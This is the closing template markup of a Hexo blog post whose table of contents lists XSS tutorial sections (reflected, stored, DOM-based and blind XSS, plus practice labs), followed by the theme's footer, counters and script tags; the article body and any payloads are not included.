+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Payloads"><span class="nav-text">XSS Payloads</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EDOM%E7%9A%84-XSS"><span class="nav-text">基于DOM的 XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blind-%E7%9B%B2%E6%B3%A8-XSS"><span class="nav-text">Blind(盲注)XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E4%BD%A0%E7%9A%84XSS-payload%EF%BC%88%E5%AE%9E%E9%AA%8C%EF%BC%89"><span class="nav-text">完善你的XSS payload（实验）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0-Blind-XSS"><span class="nav-text">练习(Blind XSS)</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Hekeatsll</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
